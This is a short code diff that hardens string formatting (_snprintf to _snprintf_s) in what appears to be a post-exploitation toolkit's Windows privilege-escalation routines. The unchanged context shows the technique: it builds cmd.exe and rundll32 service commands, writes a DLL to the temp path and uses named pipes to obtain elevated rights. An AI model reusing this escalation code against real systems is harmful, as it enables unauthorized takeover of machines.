@@ -116,9 +116,9 @@ DWORD elevate_via_service_namedpipe( Remote * remote, Packet * packet )
 		if( !cpServiceName )
 			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_namedpipe. invalid arguments", ERROR_BAD_ARGUMENTS );
 
-		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
+		_snprintf_s( cServicePipe, sizeof(cServicePipe), MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
 		
-		_snprintf( cServiceArgs, MAX_PATH, "cmd.exe /c echo %s > %s", cpServiceName, cServicePipe );
+		_snprintf_s( cServiceArgs, sizeof(cServiceArgs), MAX_PATH, "cmd.exe /c echo %s > %s", cpServiceName, cServicePipe );
 
 		pThread = thread_create( elevate_namedpipe_thread, &cServicePipe, remote );
 		if( !pThread )
@@ -199,13 +199,13 @@ DWORD elevate_via_service_namedpipe2( Remote * remote, Packet * packet )
 			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_namedpipe2. GetTempPath failed" );
 
 		if( cTempPath[ strlen(cTempPath) - 1 ] == '\\' )
-			_snprintf( cServicePath, MAX_PATH, "%s%s.dll", cTempPath, cpServiceName );
+			_snprintf_s( cServicePath, sizeof(cServicePath), MAX_PATH, "%s%s.dll", cTempPath, cpServiceName );
 		else
-			_snprintf( cServicePath, MAX_PATH, "%s\\%s.dll", cTempPath, cpServiceName );
+			_snprintf_s( cServicePath, sizeof(cServicePath), MAX_PATH, "%s\\%s.dll", cTempPath, cpServiceName );
 
-		_snprintf( cServiceArgs, MAX_PATH, "rundll32.exe %s,a /p:%s", cServicePath, cpServiceName );
+		_snprintf_s( cServiceArgs, sizeof(cServiceArgs), MAX_PATH, "rundll32.exe %s,a /p:%s", cServicePath, cpServiceName );
 		
-		_snprintf( cServicePipe, MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
+		_snprintf_s( cServicePipe, sizeof(cServicePipe), MAX_PATH, "\\\\.\\pipe\\%s", cpServiceName );
 
 		// write service dll to temp path...
 		hServiceFile = CreateFile( cServicePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
